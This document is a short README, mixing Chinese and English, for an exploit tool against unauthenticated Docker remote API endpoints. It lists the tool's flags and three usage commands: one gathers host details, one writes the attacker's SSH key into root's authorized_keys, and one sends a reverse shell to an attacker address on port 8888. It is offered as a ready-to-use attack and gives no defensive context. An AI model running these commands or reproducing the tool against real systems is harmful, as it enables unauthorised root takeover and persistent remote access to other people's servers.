## Docker remote api exp
### 参数说明

```bash
./docker_remote_api_exp 
Usage of ./docker_remote_api_exp:
  -pubkey string
    	id_rsa.pub file (default "/home/hartnett/.ssh/id_rsa.pub")
  -reverse string
    	reverse address, 6.6.6.6:8888
  -target string
    	target ip, 1.1.1.1:2375
  -type string
    	Type, such as check, root, shell (default "check")
  -version string
    	Docker version:
	---------------------------
	Docker version	API Version
	---------------------------
	1.12.x		1.24
	1.11.x		1.23
	1.10.x		1.22
	1.9.x		1.21
	1.8.x		1.20
	1.7.x		1.19
	1.6.x		1.18

 (default "1.12")
 ```

1. ./docker_remote_api_exp -type=check -target=ip:2375，获取服务器信息，如操作系统，机器名，remote api版本以及docker的安装位置等
1. ./docker_remote_api_exp -type=root -target=ip:2375 -version=1.12.3，在/root/.ssh/authorized_keys写入攻击者的ssh公钥
1. ./docker_remote_api_exp -type=shell -target=ip:2375 -version=1.12.3 -reverse=attackerIp:8888，给攻击者反弹一个shell
